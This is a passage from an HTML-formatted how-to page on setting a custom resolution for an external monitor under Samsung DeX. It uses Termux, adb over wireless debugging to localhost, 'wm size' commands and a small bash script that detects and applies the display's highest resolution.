will work on the vast majority of modern display. However, occasionally you may want to use a monitor with an “oddball” resolution (like the 2240 × 1400 resolution used by the &lt;a href=&quot;https://www.lenovo.com/us/en/p/accessories-and-software/monitors/office/63aauar6us&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Lenovo ThinkVision M14d&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;). The Android Debugging Bridge (adb) utility can be used in &lt;em&gt;many&lt;/em&gt; of these cases.&lt;/p&gt;\n&lt;h3 id=&quot;initial-setup&quot;&gt;Initial setup&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#initial-setup&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ol&gt;\n&lt;li&gt;Install &lt;a href=&quot;https://f-droid.org&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;F-Droid&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;Install &lt;a href=&quot;https://f-droid.org/en/packages/com.termux/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Termux&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;Install adb: &lt;code&gt;pkg install android-tools&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Enable wireless debugging by turning on &lt;strong&gt;Developer options → Wireless debugging&lt;/strong&gt;.&lt;/li&gt;\n&lt;li&gt;Select “Pair device with pairing code”. Note down the pairing code and port displayed in the resulting pop-up. (Note that this port is &lt;em&gt;different&lt;/em&gt; than the debugging port!)&lt;/li&gt;\n&lt;li&gt;Pair adb in Termux with the phone: &lt;code&gt;adb pair localhost:$PAIRING_PORT&lt;/code&gt;.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h3 id=&quot;setting-a-custom-resolution&quot;&gt;Setting a custom resolution&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#setting-a-custom-resolution&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ol&gt;\n&lt;li&gt;Enable wireless debugging (if it’s not already enabled from the previous section) by turning on &lt;strong&gt;Developer options → Wireless debugging&lt;/strong&gt;. Note down the port displayed under “IP address &amp;#x26; Port”.&lt;/li&gt;\n&lt;li&gt;Connect adb: &lt;code&gt;adb connect localhost:$DEBUGGING_PORT&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Use adb to set the resolution of your external display: &lt;code&gt;adb shell wm size 2240x1400 -d 2&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Disconnect adb: &lt;code&gt;adb disconnect&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Disabled wireless debugging.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;In general, the Android phone itself will use display 0. To determine the number of the external display, you can output the &lt;em&gt;current&lt;/em&gt; resolution of a display using &lt;code&gt;adb shell wm size -d #&lt;/code&gt;, where &lt;code&gt;#&lt;/code&gt; is 0, 1, 2, …&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;blockquote class=&quot;callout warning&quot; data-callout=&quot;warning&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Warning&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The display resolution set with &lt;code&gt;adb shell wm size&lt;/code&gt; will stick until either a new display resolution is set using adb, &lt;code&gt;adb shell wm size reset -d2&lt;/code&gt; (or whatever the correct display number) is run, or until a new resolution is manually chosen in the Settings app under &lt;strong&gt;Samsun DeX → Display resolution&lt;/strong&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h3 id=&quot;automatic-resolution-switcher-script&quot;&gt;Automatic resolution switcher script&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#automatic-resolution-switcher-script&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The script below should (perhaps with minor modifications) automatically set DeX’s resolution to the optimal one for your external monitor.&lt;/p&gt;\n&lt;h4 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#prerequisites&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;Turn on &lt;strong&gt;Developer options → Quick settings developer tiles → Wireless debugging&lt;/strong&gt;. This will enable you to quickly turn wireless debugging on and off.&lt;/li&gt;\n&lt;li&gt;Install Termux, &lt;code&gt;android-tools&lt;/code&gt;, and then pair (your local) adb with your (local) device using the steps described above in “Initial setup”.&lt;/li&gt;\n&lt;li&gt;Grant Termux permission to read the Android system logs: &lt;code&gt;adb shell pm grant com.termux android.permission.READ_LOGS&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Reboot your device.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=&quot;switcher-script&quot;&gt;Switcher script&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#switcher-script&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h4&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://taskernet.com/shares/?user=AS35m8leEITiG8ZaeErHEf3Th8J%2B1tZDZGTqWSk3ywlZ6o66qQY36y%2FzpquyCVhbqHx5nFvm1A%3D%3D&amp;#x26;id=Project%3ASet+max+resolution+for+external+display&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Set max resolution for external displays&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; &lt;a href=&quot;https://tasker.joaoapps.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Tasker&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; task.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/usr/bin/env bash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DISPLAY_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;HDMI Screen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DISPLAY_NUMBER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;2&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Exit on error&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;set&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get local adb port&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;logcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;adbwifi&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tail&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s/.* //&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Locally connect to the wireless debugging port&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;adb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; connect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; localhost:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get the connected display&#039;s highest resolution&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DISPLAY_RESOLUTION&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;adb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell dumpsys display &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$DISPLAY_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; awk&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -F&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; |=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/width/ &amp;#x26;&amp;#x26; /height/ {for(i=1;i&amp;#x3C;=NF;i++) if($i==&quot;width&quot;) print $(i+1) &quot;x&quot; $(i+3)}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -k1,1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -k2,2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; head&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Set the resolution for DeX&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;adb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; wm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; size&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DISPLAY_RESOLUTION&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DISPLAY_NUMBER&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Disconnect adb&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;adb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; disconnect&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Notify the user&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;MESSAGE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$DISPLAY_NAME ($DISPLAY_NUMBER) set to $DISPLAY_RESOLUTION&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;which&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; termux-notification&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; wc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; -gt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ]];&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; then&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;        termux-notification&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --icon&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; monitor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --title&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Samsung DeX&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --content&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$MESSAGE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$MESSAGE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;This will (often) generate a popup 